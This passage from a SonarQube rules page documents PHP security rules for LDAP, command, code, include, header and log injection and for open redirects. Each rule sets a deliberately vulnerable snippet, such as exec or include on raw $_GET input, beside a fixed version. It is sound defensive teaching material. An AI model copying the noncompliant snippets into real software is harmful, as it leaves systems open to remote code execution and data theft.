<ul><li> <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" rel="nofollow">OWASP Top 10 2021 Category A8</a> - Software and Data
  Integrity Failures </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization" rel="nofollow">OWASP Top 10 2017 Category A8</a> - Insecure Deserialization
  </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/502" rel="nofollow">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S2078">
              phpsecurity:S2078
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>LDAP injections occur in an application when the application retrieves untrusted data and inserts it into an LDAP query without sanitizing it
first.</p>
<p>An LDAP injection can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s
response.<br /> The absence of the corresponding response for the malicious request on the application is not a barrier to exploitation. Thus, it must
be treated the same way as basic LDAP injections.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to LDAP injection: after discovering the injection point, attackers insert data into the vulnerable
field to execute malicious LDAP commands.</p>
<p>The impact of this vulnerability depends on how vital LDAP servers are to the organization.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Data leakage or corruption</h4>
<p>In typical scenarios where systems perform innocuous LDAP operations to find users or create inventories, an LDAP injection could result in data
leakage or corruption.</p>
<h4>Privilege escalation</h4>
<p>A malicious LDAP query could allow an attacker to impersonate a low-privileged user or an administrator in scenarios where systems perform
authorization checks or authentication.</p>
<p>Attackers use this vulnerability to find multiple footholds on target organizations by gathering authentication bypasses.</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following noncompliant code is vulnerable to LDAP injection because untrusted data is concatenated to an LDAP query without prior sanitization
or validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$ldapconn &#61; ldap_connect(&#34;localhost&#34;);

if($ldapconn){
  $user &#61; $_GET[&#34;user&#34;];

  $filter &#61; &#34;(&amp;(objectClass&#61;user)(uid&#61;&#34; . $user . &#34;))&#34;;
  $dn &#61; &#34;dc&#61;example,dc&#61;org&#34;;

  ldap_list($ldapconn, $dn, $filter); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$ldapconn &#61; ldap_connect(&#34;localhost&#34;);

if($ldapconn){
  $user &#61; $ldap_escape($_GET[&#34;user&#34;], &#34;&#34;, LDAP_ESCAPE_FILTER);

  $filter &#61; &#34;(&amp;(objectClass&#61;user)(uid&#61;&#34; . $user . &#34;))&#34;;
  $dn &#61; &#34;dc&#61;example,dc&#61;org&#34;;

  ldap_list($ldapconn, $dn, $filter);
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the
initially intended logic.</p>
<p>For LDAP injection, the cleanest way to do so is to use parameterized queries if it is available for your use case.</p>
<p>Another approach is to sanitize the input before using it in an LDAP query. Input sanitization should be primarily done using native libraries.</p>
<p>Alternatively, validation can be implemented using an allowlist approach by creating a list of authorized and secure strings you want the
application to use in a query. If a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Important note</strong>: The application must sanitize and validate on the server-side. Not on client-side front-ends.</p>
<p>The most fundamental security mechanism is the restriction of LDAP metacharacters.</p>
<p>For <strong>Distinguished Names</strong> (DN), special characters that need to be escaped include:</p>
<ul><li> <code>\</code> </li><li> <code>#</code> </li><li> <code>&#43;</code> </li><li> <code>&lt;</code> </li><li> <code>&gt;</code> </li><li> <code>,</code> </li><li> <code>;</code> </li><li> <code>&#34;</code> </li><li> <code>&#61;</code> </li></ul>
<p>For <strong>Search Filters</strong>, special characters that need to be escaped include:</p>
<ul><li> <code>*</code> </li><li> <code>(</code> </li><li> <code>)</code> </li><li> <code>\</code> </li><li> <code>null</code> </li></ul>
<p>For PHP, the core library function <a href="https://www.php.net/manual/en/function.ldap-escape.php" rel="nofollow"><code>ldap_escape</code></a> allows sanitizing
these characters.</p>
<p>In the compliant solution example, the <code>ldap_escape</code> function is used with the <code>LDAP_ESCAPE_FILTER</code> flag, which sanitizes
potentially malicious characters in the search filter. The function can also be used with the <code>LDAP_ESCAPE_DN</code> flag, which sanitizes the
distinguished name (DN).</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://www.ietf.org/rfc/rfc4514.txt" rel="nofollow">RFC 4514</a> - LDAP: String Representation of Distinguished Names </li><li> <a href="https://www.ietf.org/rfc/rfc4515.txt" rel="nofollow">RFC 4515</a> - LDAP: String Representation of Search Filters </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/90" rel="nofollow">MITRE, CWE-90</a> - Improper Neutralization of Special Elements used in an LDAP Query
  (&#39;LDAP Injection&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S5146">
              phpsecurity:S5146
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Open redirection occurs when an application uses user-controllable data to redirect users to a URL.</p>
<p>An attacker with malicious intent could manipulate a user to browse into a specially crafted URL, such as
<code>https://trusted.example.com?url&#61;evil.example.com</code>, to redirect the victim to his evil domain.</p>
<p>Tricking users into sending the malicious HTTP request is usually the main task of exploiting an open redirection. Often, it requires an attacker
to build a credible pretext to prevent suspicions from the victim.<br /></p>
<p>Attackers commonly use open redirect exploits in mass phishing campaigns.</p>
<h3>What is the potential impact?</h3>
<p>If an attacker tricks a user into opening a link of his choice, the user is redirected to a domain controlled by the attacker.</p>
<p>From then on, the attacker can perform various malicious actions, some more impactful than others.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Domain Mirroring</h4>
<p>A malicious link redirects to an attacker’s controlled website mirroring the interface of a web application trusted by the user. Due to the
similarity in the application appearance and the apparently trustable clicked hyperlink, the user struggles to identify that they are browsing on a
malicious domain.<br /></p>
<p>Depending on the attacker’s purpose, the malicious website can leak credentials, bypass Multi-Factor Authentication (MFA), and reach any
authenticated data or action.</p>
<h4>Malware Distribution</h4>
<p>A malicious link redirects to an attacker’s controlled website that serves malware. On the same basis as the domain mirroring exploitation, the
attacker develops a spearphishing or phishing campaign with a carefully crafted pretext that would result in the download and potential execution of a
hosted malicious file.<br /> The worst-case scenario could result in complete system compromise.</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following noncompliant code example is vulnerable to open redirection as it constructs a URL with user-controllable data. This URL is then used
to redirect the user without being first validated. An attacker can leverage this to manipulate users into performing unwanted redirects.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$url&#61;$_GET[&#39;url&#39;];

header(&#34;Location: &#34; . $url); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$url&#61;$_GET[&#39;url&#39;];

$allowedUrls &#61; [&#39;https://example.com/&#39;];

if(in_array($url, $allowedUrls, true)){
  header(&#34;Location: &#34; . $url);
}
</pre>
<h3>How does this work?</h3>
<p>Built-in framework methods should be preferred as, more often than not, these provide additional security mechanisms. Usually, these built-in
methods are engineered for internal page redirections. Thus, they might not be the solution for the reader’s use case.</p>
<p>In case the application strictly requires external redirections based on user-controllable data, this could be done using the following
alternatives:</p>
<ol><li> Validating the <code>authority</code> part of the URL against a statically defined value (see Pitfalls). </li><li> Using an allow-list approach in case the destination URLs are multiple but limited. </li><li> Adding a customized page to which users are redirected, warning about the imminent action and requiring manual authorization to proceed. </li></ol>
<h3>Pitfalls</h3>
<h4>The trap of &#39;StartsWith&#39; and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator <code>/</code> as the last character</strong>.<br /></p>
<p>If the validation string does not contain a terminating path separator, the Open Redirect vulnerability remains; only the exploitation technique
changes.</p>
<p>Thus, a validation like <code>startsWith(&#34;https://example.com&#34;)</code> or an equivalent with the regex <code>^https://example\.com.*</code> can be
exploited with the following URL <code>https://example.com.malicious.io</code>. The practice of taking over domains that maliciously look like
existing domains is widespread and is called <a href="https://en.wikipedia.org/wiki/Cybersquatting" rel="nofollow">Cybersquatting</a>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/601" rel="nofollow">MITRE, CWE-601</a> - URL Redirection to Untrusted Site (&#39;Open Redirect&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S5145">
              phpsecurity:S5145
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Log injection occurs when an application fails to sanitize untrusted data used for logging.</p>
<p>An attacker can forge log content to prevent an organization from being able to trace back malicious activities.</p>
<h3>What is the potential impact?</h3>
<p>If an attacker can insert arbitrary data into a log file, the integrity of the chain of events being recorded can be compromised.<br /> This
frequently occurs because attackers can inject the log entry separator of the logger framework, commonly newlines, and thus insert artificial log
entries. <br /> Other attacks could also occur requiring only field pollution, such as cross-site scripting (XSS) or code injection (for example,
Log4Shell) if the logged data is fed to other application components, which may interpret the injected data differently.<br /></p>
<p>The focus of this rule is newline character replacement.</p>
<h4>Log Forge</h4>
<p>An attacker, able to create independent log entries by injecting log entry separators, inserts bogus data into a log file to conceal his malicious
activities. This obscures the content for an incident response team to trace the origin of the breach as the indicators of compromise (IoCs) lead to
fake application events.</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to log injection as it constructs log entries using untrusted data. An attacker can leverage this to manipulate
the chain of events being recorded.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$input &#61; $_GET[&#34;input&#34;];

error_log($input); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$input &#61; $_GET[&#34;input&#34;];

if(preg_match(&#34;/[^A-Za-z0-9-_]/&#34;, $input)){
  $safeinput &#61; &#39;[&#39; . base64_encode($input) . &#39;]&#39;;
}else{
  $safeinput &#61; $input;
}
error_log($safeinput);
</pre>
<h3>How does this work?</h3>
<p>Data used for logging should be content-restricted and typed. This can be done by validating the data content or sanitizing it.<br /> Validation and
sanitization mainly revolve around preventing carriage return (CR) and line feed (LF) characters. However, further actions could be required based on
the application context and the logged data usage.</p>
<p>Here, the example compliant code uses the <code>preg_match</code> function to check if the input contains any unsafe character. In which case, the
<code>base64_encode</code> function is used to prevent any injection while keeping the input original content.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/" rel="nofollow">OWASP Top 10 2021 Category A9</a> - Security Logging and
  Monitoring Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring" rel="nofollow">OWASP Top 10 2017 Category A10</a> -
  Insufficient Logging &amp; Monitoring </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/117" rel="nofollow">MITRE, CWE-117</a> - Improper Output Neutralization for Logs </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S5167">
              phpsecurity:S5167
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;php%3AS5122&amp;rule_key&#61;php%3AS5122" rel="nofollow">S5122</a>, <a href="/organizations/sopra-steria/rules?open&#61;php%3AS5146&amp;rule_key&#61;php%3AS5146" rel="nofollow">S5146</a>, <a href="/organizations/sopra-steria/rules?open&#61;php%3AS6287&amp;rule_key&#61;php%3AS6287" rel="nofollow">S6287</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>User-provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Applications
constructing HTTP response headers based on tainted data could allow attackers to change security sensitive headers like Cross-Origin Resource Sharing
headers.</p>
<p>Web application frameworks and servers might also allow attackers to inject new line characters in headers to craft malformed HTTP response. In
this case the application would be vulnerable to a larger range of attacks like HTTP Response Splitting/Smuggling. Most of the time this type of
attack is mitigated by default modern web application frameworks but there might be rare cases where older versions are still vulnerable.</p>
<p>As a best practice, applications that use user-provided data to construct the response header should always validate the data first. Validation
should be based on a whitelist.</p>
<h3>Noncompliant code example</h3>
<pre>
$value &#61; $_GET[&#34;value&#34;];
header(&#34;X-Header: $value&#34;); // Noncompliant
</pre>
<h3>Compliant solution</h3>
<pre>
$value &#61; $_GET[&#34;value&#34;];
if (ctype_alnum($value)) {
  header(&#34;X-Header: $value&#34;); // Compliant
} else {
  // Error
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/HTTP_Response_Splitting" rel="nofollow">OWASP Attack Category</a> - HTTP Response Splitting </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/113" rel="nofollow">MITRE, CWE-113</a> - Improper Neutralization of CRLF Sequences in HTTP Headers (&#39;HTTP
  Response Splitting&#39;) </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S5335">
              phpsecurity:S5335
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Include injections occur in an application when the application retrieves data from a user or a third-party service and inserts it into an
<code>include</code> expression without sanitizing it first.</p>
<p>If an application contains an <code>include</code> expression that is vulnerable to injections, it is exposed to attacks that target the underlying
server.</p>
<h3>What is the potential impact?</h3>
<p>A user with malicious intent can create requests that will cause the <code>include</code> expression to leak valuable data or achieve remote code
execution on the server’s website.</p>
<p>After creating the malicious request, the attacker can attack the servers affected by this vulnerability without relying on any prerequisites.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,
and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul><li> download the internal server’s data, most likely to sell it </li><li> modify data, send malware </li><li> stop services or exhaust resources (with fork bombs for example) </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of OS injections and <strong>misconfiguration</strong> of:</p>
<ul><li> Docker or Kubernetes clusters </li><li> cloud services </li><li> network firewalls and routing </li><li> OS access control </li></ul>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$filename &#61; $_GET[&#34;filename&#34;];
include $filename; // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$INCLUDE_ALLOW_LIST &#61; [
    &#34;home.php&#34;,
    &#34;dashboard.php&#34;,
    &#34;profile.php&#34;,
    &#34;settings.php&#34;
];

$filename &#61; $_GET[&#34;filename&#34;];
if (in_array($filename, $INCLUDE_ALLOW_LIST)) {
  include $filename;
}
</pre>
<h3>How does this work?</h3>
<h4>Pre-Approved files</h4>
<p>The cleanest way to avoid this defect is to validate the input before using it in an <code>include</code>-type expression.</p>
<p>Create a list of authorized and secure files that you want the application to be able to load with <code>include</code>-type expressions.<br /> If a
user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" rel="nofollow">OWASP Top 10 2021 Category A8</a> - Software and Data
  Integrity Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/97" rel="nofollow">MITRE, CWE-97</a> - Improper Neutralization of Server-Side Includes (SSI) Within a Web Page
  </li><li> <a href="https://cwe.mitre.org/data/definitions/98" rel="nofollow">MITRE, CWE-98</a> - Improper Control of Filename for Include/Require Statement in PHP
  Program (&#39;PHP Remote File Inclusion&#39;) </li><li> <a href="https://cwe.mitre.org/data/definitions/829" rel="nofollow">MITRE, CWE-829</a> - Inclusion of Functionality from Untrusted Control Sphere </li><li> <a href="https://www.sans.org/top25-software-errors/#cat2" rel="nofollow">SANS Top 25</a> - Risky Resource Management </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S2076">
              phpsecurity:S2076
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>OS command injections occur when applications build command lines from untrusted data before executing them with a system shell.<br /> In that case,
an attacker can tamper with the command line construction and force the execution of unexpected commands. This can lead to the compromise of the
underlying operating system.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting an OS command injection vulnerability will be able to execute arbitrary commands on the underlying operating system.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,
and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul><li> download the internal server’s data, most likely to sell it </li><li> modify data, send malware </li><li> stop services or exhaust resources (with fork bombs for example) </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of OS injections and <strong>misconfiguration</strong> of:</p>
<ul><li> Docker or Kubernetes clusters </li><li> cloud services </li><li> network firewalls and routing </li><li> OS access control </li></ul>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to command injections because it is using untrusted inputs to set up a new process. Therefore an attacker can
execute an arbitrary program that is installed on the system.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$command &#61; $_GET[&#39;cmd&#39;];
exec($command, $output, $ret); // Noncompliant

echo ($ret &#61;&#61; 0 ? &#34;OK&#34; : &#34;KO&#34;);
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$allowedCommands &#61; [[&#34;/bin/ping&#34;,&#34;-c&#34;,&#34;1&#34;,&#34;--&#34;],[&#34;/usr/bin/host&#34;,&#34;--&#34;]];
$cmd &#61; $allowedCommands[$_GET[&#34;cmdId&#34;]];
$cmd[] &#61; $_GET[&#34;host&#34;];

$process &#61; proc_open($cmd, [], $pipes);
$ret &#61; proc_close($process);

echo ($ret &#61;&#61; 0 ? &#34;OK&#34; : &#34;KO&#34;);
</pre>
<h3>How does this work?</h3>
<p>Allowing users to execute operating system commands generally creates more problems than it solves.</p>
<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br /> Therefore, our first suggestion is to
avoid using OS commands in the first place.<br /> However, if the application requires running OS commands with user-controlled data, here are some
security suggestions.</p>
<h4>Pre-Approved commands</h4>
<p>If the application aims to execute only a small number of OS commands (for example, <code>ls</code>, <code>pwd</code>, and <code>grep</code>), the
cleanest way to avoid this problem is to validate the input before using it in an OS command.</p>
<p>Create a list of authorized and secure commands that you want the application to be able to execute. Use absolute paths to avoid any ambiguity.<br />
If a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p>Depending on the number of commands you want the application to support, the list can be either a regex string or any array type. If you use
regexes, choose simple regexes to avoid ReDOS attacks. For example, you can accept only a specific set of executables, by using
<code>^/bin/(ls|pwd|grep)$</code>.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<p>In the example compliant code, a static list of allowed commands is used. Users are only allowed to provide a command index that will be used to
access this list. The command resulting from the list access can be considered trusted.</p>
<h4>Neutralize special characters</h4>
<p>If the application is to execute complex commands that cannot be controlled thanks to pre-approved lists, the cleanest approach is to use special
sanitization components, such as <code>proc_open</code>.</p>
<p>The library helps you to get rid of common dangerous characters, such as:</p>
<ul><li> <code>&amp;</code> </li><li> <code>|</code> </li><li> <code>;</code> </li><li> <code>$</code> </li><li> <code>&gt;</code> </li><li> <code>&lt;</code> </li><li> <code>\&#96;</code> </li><li> <code>\\</code> </li><li> <code>!</code> </li></ul>
<p>If user input is to be included in the arguments of a command, the application must ensure that dangerous options or argument delimiters are
neutralized.<br /> Argument delimiters count <code>&#39;</code>, <code>-</code> and spaces.</p>
<p>For example, the <code>find</code> command from UNIX supports the dangerous argument <code>-exec</code>.<br /> In this case, option processing can be
terminated with a string containing <code>--</code> or with special options. For example, <code>git</code> supports <code>--end-of-options</code> <a href="https://github.blog/2019-11-03-highlights-from-git-2-24/#tidbits" rel="nofollow">since its version 2.24</a>.</p>
<p>In the example compliant code, the <code>proc_open</code> function is used in place of the less safe <code>exec</code> alternative. Moreover, the
<code>command</code> parameter of this function is set to an array. That way, the function will properly escape all the array elements and concatenate
them to form the command line to execute.</p>
<h4>Disable shell integration</h4>
<p>In most cases, command execution libraries propose two ways to execute external program: with or without shell integration.</p>
<p>When shell integration is allowed, an attacker with control over the command arguments can simply execute additional external programs using system
shell features. For example, on Unix, command pipelining (<code>|</code>) or string interpolation (<code>$()</code>, <code>&lt;()</code>, etc.) can be
used to break out of a command call.</p>
<p>Therefore, it is generally preferable to disable shell integration.</p>
<p>In the example compliant code, using the <code>proc_open</code> function with an array of arguments as a parameter disables shell integration.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html" rel="nofollow">OWASP, OS Command Injection Defense
  Cheaty Sheet</a> </li><li> <a href="https://gtfobins.github.io/#&#43;shell" rel="nofollow">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li><li> <a href="https://lolbas-project.github.io/#" rel="nofollow">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/78" rel="nofollow">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S5334">
              phpsecurity:S5334
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Code injections occur when applications allow the dynamic execution of code instructions from untrusted data.<br /> An attacker can influence the
behavior of the targeted application and modify it to get access to sensitive data.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting a dynamic code injection vulnerability will be able to execute arbitrary code in the context of the vulnerable
application.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process that executes the code
runs with root privileges, and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul><li> download the internal server’s data, most likely to sell it </li><li> modify data, send malware </li><li> stop services or exhaust resources (with fork bombs for example) </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of code injections and <strong>misconfiguration</strong> of:</p>
<ul><li> Docker or Kubernetes clusters </li><li> cloud services </li><li> network firewalls and routing </li><li> OS access control </li></ul>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to arbitrary code execution because it builds and dynamically runs PHP code based on untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$operation &#61; $_GET[&#39;operation&#39;];
eval(&#34;product_${operation}();&#34;); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$allowed &#61; [&#34;add&#34;, &#34;remove&#34;, &#34;update&#34;];
$operation &#61; $allowed[$_GET[&#34;operationId&#34;]];
if ($operation !&#61;&#61; &#34;&#34;) {
    eval(&#34;product_${operation}();&#34;);
}
</pre>
<h3>How does this work?</h3>
<p>Allowing users to execute code dynamically generally creates more problems than it solves.</p>
<p>Anything that can be done via dynamic code execution can usually be done via a language’s native SDK and static code.<br /> Therefore, our suggestion
is to avoid executing code dynamically.<br /> If the application requires the execution of dynamic code, additional security measures must be taken.</p>
<h4>Dynamic parameters</h4>
<p>When the untrusted values are only expected to be values used in standard processing, it is generally possible to provide them as parameters of the
dynamic code. In that case, care should be taken to ensure that only the <strong>name</strong> of the untrusted parameter is passed to the dynamic
code and not that its value is expanded into it. After that, the dynamic code will be able to safely access the untrusted parameter content and
perform the processing.</p>
<h4>Allow list</h4>
<p>When the untrusted parameters are expected to contain operators, function names or other reflection-related values, best practices would encourage
using an allow list. This one would contain a list of accepted safe values that can be used as part of the dynamic code.</p>
<p>When receiving an untrusted parameter, the application would verify its value is contained in the configured allow list. If it is present, the
parameter is accepted. Otherwise, it is rejected and an error is raised.</p>
<p>Another similar approach is using a binding between identifiers and accepted values. That way, users are only allowed to provide identifiers, where
only valid ones can be converted to a safe value.</p>
<p>The compliant code example uses such a binding approach.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://blog.sonarsource.com/moodle-remote-code-execution/" rel="nofollow">SonarSource, Evil Teacher: Code Injection in Moodle</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/95" rel="nofollow">MITRE, CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
  (&#39;Eval Injection&#39;) </li><li> <a href="https://www.sans.org/top25-software-errors/#cat2" rel="nofollow">SANS Top 25</a> - Risky Resource Management </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S3649">
              phpsecurity:S3649
            </a>
          </td>
          <td>
            <details>
